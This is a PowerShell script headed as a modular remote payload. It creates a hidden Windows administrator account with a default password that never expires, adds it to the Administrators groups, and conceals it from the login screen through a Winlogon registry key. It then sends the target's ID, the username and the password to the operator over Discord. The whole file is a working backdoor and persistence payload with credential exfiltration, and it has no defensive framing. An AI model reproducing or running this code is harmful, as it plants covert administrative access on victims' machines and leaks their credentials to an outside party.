# ============================================================
# Create Hidden Admin for Windows - Modular Remote Payload
# ============================================================
# Creates a hidden administrator account
# ============================================================

$sysid = Get-SystemID

# Check for Admin privileges
if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Send-Discord "⚠️ **Admin Creation Failed**`nTarget: $sysid`nError: Administrator privileges required."
    exit
}

# Configuration
$username = if ($env:USR) { $env:USR } else { "sysadmin" }
$password = if ($env:PWD) { $env:PWD } else { "P@ssw0rd123!" }

try {
    # Create user
    $securePass = ConvertTo-SecureString $password -AsPlainText -Force
    New-LocalUser -Name $username -Password $securePass -Description "" -PasswordNeverExpires -AccountNeverExpires -UserMayNotChangePassword 2>$null
    
    # Add to Administrators (try both English and German)
    Add-LocalGroupMember -Group "Administrators" -Member $username 2>$null
    Add-LocalGroupMember -Group "Administratoren" -Member $username 2>$null
    
    # Hide from login screen
    $regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"
    if (!(Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $username -Value 0 -Type DWord -Force
    
    Send-Discord "👤 **Admin Created on $sysid**`n• Username: ``$username```n• Password: ``$password```n• Hidden: ✅"
} catch {
    Send-Discord "❌ Admin creation failed on $sysid: $($_.Exception.Message)"
}
